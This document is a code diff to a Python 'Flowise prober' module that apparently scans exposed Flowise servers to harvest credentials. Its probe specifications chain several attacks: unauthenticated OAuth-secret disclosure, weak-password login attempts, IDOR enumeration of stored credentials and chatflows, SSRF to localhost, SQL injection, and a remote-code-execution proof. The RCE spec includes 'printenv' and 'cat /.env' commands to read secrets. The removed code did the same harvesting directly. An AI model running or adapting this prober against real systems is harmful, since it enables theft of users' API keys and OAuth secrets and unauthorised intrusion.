@@ -1,14 +1,4 @@
-"""Flowise prober — OAuth secrets + credential component leaks.
-
-Unauthenticated endpoints (CVE-2026-56270, Flowise < 3.1.0):
-  - GET /api/v1/loginmethod?organizationId=<org> → leaks OAuth client secrets
-    for Google/Azure/GitHub/Auth0 integrations.
-
-Weak-password login → read:
-  - POST /api/v1/auth/login → get JWT
-  - GET /api/v1/credentials → component credentials (API keys stored by users)
-  - GET /api/v1/chatflows → flow configs that may embed keys inline
-"""
+"""Flowise prober — OAuth secrets, credentials, true IDOR, optional SSRF/RCE."""
 
 from __future__ import annotations
 
@@ -17,9 +7,123 @@ from typing import Any
 
 from aipocket.core.models import Credential
 
-from ..base import WEAK_CREDENTIALS, Prober
+from ..base import Prober
+from ..capability import ProbeSpec, RiskLevel, VulnClass
+from ._l2l3 import sqli_spec
 
 log = logging.getLogger(__name__)
+
+SPECS = [
+    ProbeSpec(
+        id="flowise.unauth",
+        product="flowise",
+        vuln_class=VulnClass.UNAUTH_READ,
+        risk_level=RiskLevel.L0,
+        cve_ids=("CVE-2026-56270",),
+        entry={
+            "paths": [
+                "/api/v1/loginmethod",
+                "/api/v1/credentials",
+                "/api/v1/chatflows",
+                "/api/v1/apikeys",
+            ],
+            "expand_params": {"organizationId": ["", "1", "default"]},
+            "tag_prefix": "flowise",
+        },
+        max_requests=8,
+    ),
+    ProbeSpec(
+        id="flowise.weak_password",
+        product="flowise",
+        vuln_class=VulnClass.WEAK_PASSWORD,
+        risk_level=RiskLevel.L1,
+        entry={
+            "auth_style": "login_json",
+            "login": "/api/v1/auth/login",
+            "body": {"username": "{user}", "password": "{pass}"},
+            "token_fields": ["token", "access_token"],
+            "post_auth_paths": [
+                "/api/v1/credentials",
+                "/api/v1/chatflows",
+                "/api/v1/apikeys",
+            ],
+        },
+        max_requests=12,
+    ),
+    ProbeSpec(
+        id="flowise.idor.chatflows",
+        product="flowise",
+        vuln_class=VulnClass.IDOR,
+        risk_level=RiskLevel.L1,
+        requires_auth=True,
+        depends_on=("flowise.weak_password",),
+        entry={
+            "list": "/api/v1/chatflows",
+            "object": "/api/v1/chatflows/{id}",
+            "id_enum_max": 5,
+            "id_fields": ["id", "_id", "chatflowId"],
+            "use_auth": True,
+        },
+        max_requests=6,
+    ),
+    ProbeSpec(
+        id="flowise.idor.credentials",
+        product="flowise",
+        vuln_class=VulnClass.IDOR,
+        risk_level=RiskLevel.L1,
+        requires_auth=True,
+        depends_on=("flowise.weak_password",),
+        entry={
+            "list": "/api/v1/credentials",
+            "object": "/api/v1/credentials/{id}",
+            "id_enum_max": 5,
+            "id_fields": ["id", "_id"],
+            "use_auth": True,
+        },
+        max_requests=6,
+    ),
+    ProbeSpec(
+        id="flowise.ssrf.fetch",
+        product="flowise",
+        vuln_class=VulnClass.SSRF,
+        risk_level=RiskLevel.L2,
+        entry={
+            "path": "/api/v1/node-load-method/fetch",
+            "method": "POST",
+            "url_param": "url",
+            "body": {},
+            "target_urls": ["http://127.0.0.1/", "http://localhost/"],
+            "use_auth": True,
+        },
+        requires_auth=False,
+        max_requests=3,
+    ),
+    ProbeSpec(
+        id="flowise.rce.proof",
+        product="flowise",
+        vuln_class=VulnClass.RCE,
+        risk_level=RiskLevel.L3,
+        entry={
+            "path": "/api/v1/node-load-method/customFunction",
+            "method": "POST",
+            "param": "javascriptFunction",
+            # Engine whitelist only accepts shell-like commands; product may
+            # map this field differently — Spec is gated default-off.
+            "proof_command": "echo aipocket-rce-proof",
+            "secret_commands": ["printenv", "cat /.env"],
+            "body": {},
+            "use_auth": True,
+        },
+        max_requests=2,
+    ),
+    sqli_spec(
+        "flowise",
+        path="/api/v1/chatflows",
+        param="name",
+        use_auth=True,
+        suffix="sqli_chatflows",
+    ),
+]
 
 
 class FlowiseProber(Prober):
@@ -31,59 +135,4 @@ class FlowiseProber(Prober):
         return "flowise" in blob or "flowiseai" in blob
 
     async def probe(self, hit: dict[str, Any]) -> list[Credential]:
-        creds: list[Credential] = []
-
-        # 1. Unauthenticated OAuth secrets disclosure (CVE-2026-56270)
-        # Try common organizationId values — many instances use default "1" or "".
-        for org_id in ("", "1", "default"):
-            url = self._url(hit, "/api/v1/loginmethod")
-            params = {"organizationId": org_id} if org_id else {}
-            resp = await self._get(url, params=params)
-            if resp and resp.status_code == 200 and len(resp.text) > 50:
-                found = self._extract_from_response(resp, hit, "flowise_loginmethod")
-                if found:
-                    creds.extend(found)
-                    break  # got it, no need to try more org IDs
-
-        # 2. Unauthenticated credential/component read (misconfigured instances)
-        for path in ("/api/v1/credentials", "/api/v1/chatflows", "/api/v1/apikeys"):
-            resp = await self._get(self._url(hit, path))
-            found = self._extract_from_response(resp, hit, f"flowise_unauth_{path.split('/')[-1]}")
-            creds.extend(found)
-
-        # 3. Weak-password login → authenticated reads
-        token = await self._try_login(hit) if self._intrusive_authorized(hit) else ""
-        if token:
-            for path in ("/api/v1/credentials", "/api/v1/chatflows", "/api/v1/apikeys"):
-                resp = await self._get(
-                    self._url(hit, path),
-                    headers={"Authorization": f"Bearer {token}"},
-                )
-                found = self._extract_from_response(
-                    resp, hit, f"flowise_authed_{path.split('/')[-1]}"
-                )
-                creds.extend(found)
-
-        return creds
-
-    async def _try_login(self, hit: dict[str, Any]) -> str:
-        url = self._url(hit, "/api/v1/auth/login")
-        if not url:
-            return ""
-        for username, password in WEAK_CREDENTIALS:
-            resp = await self._post(url, json={"username": username, "password": password})
-            if resp is None or resp.status_code != 200:
-                continue
-            try:
-                data = resp.json()
-            except ValueError:
-                continue
-            token = data.get("token") or data.get("access_token") or ""
-            if token:
-                log.debug(
-                    "flowise login success on %s with user %s",
-                    hit.get("host", ""),
-                    username,
-                )
-                return token
-        return ""
+        return await self.run_specs(hit, SPECS)
